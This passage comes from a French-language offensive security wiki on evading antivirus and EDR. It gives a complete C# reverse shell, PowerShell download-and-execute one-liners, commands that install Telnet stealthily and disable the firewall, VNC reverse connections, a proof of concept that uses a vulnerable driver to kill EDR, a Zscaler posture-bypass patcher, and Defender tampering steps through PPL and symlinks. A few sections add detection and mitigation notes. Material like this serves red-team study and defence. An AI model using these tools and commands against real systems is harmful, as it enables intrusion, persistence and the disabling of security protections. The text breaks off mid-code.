Charger des binaires C# en mémoire est connu depuis longtemps et reste une excellente façon d'exécuter vos outils post-exploitation sans être détecté par AV.

Puisque le payload sera chargé directement en mémoire sans toucher au disque, il faudra seulement se préoccuper de patcher AMSI pour tout le processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) fournissent déjà la capacité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes manières de le faire :

- **Fork\&Run**

Cela implique de **créer un nouveau processus sacrificiel**, d'injecter votre code malveillant post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant puis, une fois terminé, de tuer ce nouveau processus. Cela présente à la fois des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus implant Beacon. Cela signifie que si quelque chose se passe mal durant notre action post-exploitation ou est détecté, il y a une **beaucoup plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande chance** d'être détecté par des **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant post-exploitation **dans son propre processus**. De cette façon, vous évitez de créer un nouveau processus qui pourrait être scanné par l'AV, mais l'inconvénient est que si quelque chose tourne mal lors de l'exécution de votre payload, il y a une **beaucoup plus grande chance** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous voulez en savoir plus sur le chargement d'Assembly C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des C# Assemblies **depuis PowerShell**, regardez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la vidéo de S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise accès **à l'environnement d'interpréteur installé sur le partage SMB contrôlé par l'attaquant**.

En autorisant l'accès aux binaries de l'interpréteur et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** de la machine compromise.

Le repo indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc. nous avons **plus de flexibilité pour contourner les signatures statiques**. Des tests avec des reverse shells aléatoires non-obfusqués dans ces langages se sont avérés concluants.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le token d'accès ou un produit de sécurité comme un EDR ou un AV**, leur permettant de réduire ses privilèges de sorte que le processus ne meure pas mais n'ait pas les permissions pour vérifier les activités malveillantes.

Pour prévenir cela, Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d'une victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

L'évasion est un sujet très compliqué, parfois il faut prendre en compte de nombreuses sources de télémétrie sur un seul système, il est donc pratiquement impossible de rester complètement indétectable dans des environnements matures.

Chaque environnement que vous rencontrez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette conférence de [@ATTL4S](https://twitter.com/DaniLJ94), pour vous familiariser avec des techniques d'évasion avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ceci est aussi une autre excellente conférence de [@mariuszbit](https://twitter.com/mariuszbit) à propos de l'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes Techniques**

### **Vérifier quelles parties Defender trouve comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui va **retirer des parties du binaire** jusqu'à ce qu'il **détermine quelle partie Defender** considère comme malveillante et vous la sépare.\
Un autre outil faisant la **même chose est** [**avred**](https://github.com/dobin/avred) avec une offre web ouverte du service sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (stealth) et désactiver le firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements binaires, pas l'installateur)

**SUR L'HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier **nouvellement** créé _**UltraVNC.ini**_ à l'intérieur de la **victim**

#### **Reverse connection**

L'**attacker** doit **exécuter depuis** son **host** le binaire `vncviewer.exe -listen 5900` afin d'être **préparé** à capter une reverse **VNC connection**. Ensuite, dans la **victim** : démarrez le démon `winvnc.exe -run` et lancez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENTION :** Pour maintenir le stealth vous ne devez pas faire les actions suivantes

- Ne démarrez pas `winvnc` s'il est déjà en cours d'exécution sinon vous déclencherez un [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s'il tourne avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire sinon cela ouvrira [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
- Ne lancez pas `winvnc -h` pour l'aide sinon vous déclencherez un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant, **démarrez le listener** avec `msfconsole -r file.rc` et **exécutez** le **payload XML** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'antivirus en place terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# en utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscators pour C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de python pour construire des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 a utilisé un petit utilitaire console connu sous le nom de **Antivirus Terminator** pour désactiver les protections endpoint avant de déployer le ransomware. L'outil apporte **son propre driver vulnérable mais *signé*** et l'abuse pour exécuter des opérations privilégiées dans le noyau que même les services AV en Protected-Process-Light (PPL) ne peuvent bloquer.

Key take-aways
1. **Signed driver**: The file delivered to disk is `ServiceMouse.sys`, but the binary is the legitimately signed driver `AToolsKrnl64.sys` from Antiy Labs’ “System In-Depth Analysis Toolkit”. Because the driver bears a valid Microsoft signature it loads even when Driver-Signature-Enforcement (DSE) is enabled.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme un **service noyau** et la seconde le démarre de sorte que `\\.\ServiceMouse` devienne accessible depuis l'espace utilisateur.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD skips user-mode protections entirely; code that executes in the kernel can open *protected* processes, terminate them, or tamper with kernel objects irrespective of PPL/PP, ELAM or other hardening features.

Detection / Mitigation
•  Enable Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) so Windows refuses to load `AToolsKrnl64.sys`.  
•  Monitor creations of new *kernel* services and alert when a driver is loaded from a world-writable directory or not present on the allow-list.  
•  Watch for user-mode handles to custom device objects followed by suspicious `DeviceIoControl` calls.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applies device-posture rules locally and relies on Windows RPC to communicate the results to other components. Two weak design choices make a full bypass possible:

1. Posture evaluation happens **entirely client-side** (a boolean is sent to the server).
2. Internal RPC endpoints only validate that the connecting executable is **signed by Zscaler** (via `WinVerifyTrust`).

By **patching four signed binaries on disk** both mechanisms can be neutralised:

| Binaire | Logique d'origine patchée | Résultat |
|--------|---------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Renvoie toujours `1` donc chaque vérification est conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | NOP-ed ⇒ n'importe quel processus (même non signé) peut se lier aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacée par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d'intégrité sur le tunnel | Court-circuitées |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la pile de services :

* **Toutes** les vérifications de posture affichent **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les endpoints RPC par pipe nommé (p.ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas montre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques modifications d'octets.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforce une hiérarchie signataire/niveau de sorte que seuls les processus protégés de niveau égal ou supérieur peuvent se modifier mutuellement. Dans un cadre offensif, si vous pouvez légitimement lancer un binaire activé PPL et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (p.ex., logging) en une primitive d'écriture limitée, soutenue par PPL, ciblant des répertoires protégés utilisés par AV/EDR.

What makes a process run as PPL
- L'EXE cible (et toutes les DLL chargées) doit être signé avec un EKU compatible PPL.
- Le processus doit être créé avec CreateProcess en utilisant les flags : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible doit être demandé correspondant au signataire du binaire (p.ex., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires anti-malware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Des niveaux incorrects échoueront à la création.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Schéma d'utilisation :
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui‑même et accepte un paramètre pour écrire un fichier de log à un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture du fichier s'effectue avec le support PPL.
- ClipUp ne peut pas parser les chemins contenant des espaces ; utilisez des chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Dériver un chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancez le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un lanceur (par ex., CreateProcessAsPPL).
2) Passez l'argument de chemin de log de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (par ex., Defender Platform). Utilisez les noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV pendant son exécution (par ex., MsMpEng.exe), planifiez l'écriture au démarrage avant que l'AV ne démarre en installant un service à démarrage automatique qui s'exécute de façon fiable plus tôt. Validez l'ordre de démarrage avec Process Monitor (journalisation du démarrage).
4) Au reboot, l'écriture avec le support PPL se produit avant que l'AV ne verrouille ses binaires, corruptant le fichier cible et empêchant son démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà du placement ; la primitive convient davantage à la corruption qu'à une injection précise de contenu.
- Nécessite des privilèges Local Administrator/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Detections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, en particulier parenté par des lanceurs non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Investiguer la création/modification de services précédant des échecs de démarrage de Defender.
- Surveillance d'intégrité des fichiers sur les binaires/les répertoires Platform de Defender ; créations/modifications de fichiers inattendues par des processus ayant des flags protected-process.
- Télémetry ETW/EDR : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale du niveau PPL par des binaires non-AV.

Mitigations
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s'exécuter en tant que PPL et sous quels parents ; bloquer l'invocation de ClipUp hors des contextes légitimes.
- Hygiène des services : restreindre la création/modification des services à démarrage automatique et surveiller la manipulation de l'ordre de démarrage.
- Assurer que Defender tamper protection et les protections d'early-launch sont activées ; investiguer les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération de noms courts 8.3 sur les volumes hébergeant les outils de sécurité si compatible avec votre environnement (tester soigneusement).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender choisit la plateforme à partir de laquelle il s'exécute en énumérant les sous-dossiers sous :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier ayant la plus grande chaîne de version lexicographique (p.ex., `4.18.25070.5-0`), puis démarre les processus de service Defender depuis cet emplacement (mettant à jour les chemins de service/registry en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux directory reparse points (symlinks). Un administrateur peut tirer parti de ceci pour rediriger Defender vers un chemin inscriptible par un attaquant et réaliser du DLL sideloading ou perturber le service.

Preconditions
- Administrateur local (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Possibilité de redémarrer ou de déclencher la re-sélection de la platform Defender (redémarrage du service au boot)
- Uniquement des outils intégrés requis (mklink)

Why it works
- Defender empêche les écritures dans ses propres dossiers, mais sa sélection de platform fait confiance aux entrées de répertoire et choisit la version lexicographiquement la plus élevée sans vérifier que la cible résout vers un chemin protégé/de confiance.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un lien symbolique de répertoire de version supérieure dans Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé):
```cmd
shutdown /r /t 0
```
4) Vérifier que MsMpEng.exe (WinDefend) s'exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` et la configuration du service/le registre reflétant cet emplacement.

Post-exploitation options
- DLL sideloading/code execution: Déposer/remplacer des DLL que Defender charge depuis son répertoire d'application pour exécuter du code dans les processus de Defender. Voir la section ci-dessus: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Supprimez le version-symlink afin que, au prochain démarrage, le chemin configuré ne se résolve pas et que Defender échoue à démarrer:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Notez que cette technique ne fournit pas d'escalade de privilèges en elle‑même ; elle nécessite des droits administrateur.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les red teams peuvent déplacer l'évasion à l'exécution hors de l'implant C2 et dans le module cible lui‑même en hookant son Import Address Table (IAT) et en routant certaines APIs via du code position‑independent contrôlé par l'attaquant (PIC). Cela généralise l'évasion au‑delà de la petite surface d'API exposée par de nombreux kits (p. ex. CreateProcessA), et étend les mêmes protections aux BOFs et aux DLLs post‑exploitation.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Esquisse minimale d'un IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l'import. Les Reflective loaders comme TitanLdr/AceLdr démontrent du hooking pendant DllMain du module chargé.
- Gardez les wrappers petits et PIC-safe ; résolvez la véritable API via la valeur IAT originale que vous avez capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs construisent une fausse chaîne d'appels (adresses de retour pointant vers des modules bénins) puis pivotent vers la véritable API.
- Cela contourne les détections qui s'attendent à des stacks canoniques provenant de Beacon/BOFs vers des APIs sensibles.
- Associez avec les techniques stack cutting/stack stitching pour atterrir à l'intérieur des frames attendues avant le prologue de l'API.

Operational integration
- Préfixez le reflective loader aux DLLs post‑ex afin que le PIC et les hooks s'initialisent automatiquement lors du chargement de la DLL.
- Utilisez un script Aggressor pour enregistrer les APIs cibles afin que Beacon et BOFs bénéficient de façon transparente du même chemin d'évasion sans modifications du code.

Detection/DFIR considerations
- IAT integrity : entrées qui se résolvent vers des adresses non‑image (heap/anon) ; vérification périodique des pointeurs d'import.
- Stack anomalies : adresses de retour n'appartenant pas aux images chargées ; transitions abruptes vers PIC non‑image ; antécédents RtlUserThreadStart incohérents.
- Loader telemetry : écritures in‑process vers l'IAT, activité précoce de DllMain qui modifie les import thunks, régions RX inattendues créées au chargement.
- Image‑load evasion : si hooking LoadLibrary*, surveillez les chargements suspects d'automation/clr assemblies corrélés avec des événements de memory masking.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustre comment les info‑stealers modernes mélangent AV bypass, anti-analysis et credential access dans un seul workflow.

### Keyboard layout gating & sandbox delay

- Un flag de configuration (`anti_cis`) énumère les dispositions clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est détectée, l'échantillon dépose un marqueur vide `CIS` et termine avant d'exécuter les stealers, garantissant qu'il ne se déclenche jamais sur des locales exclues tout en laissant un artefact pour la chasse.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
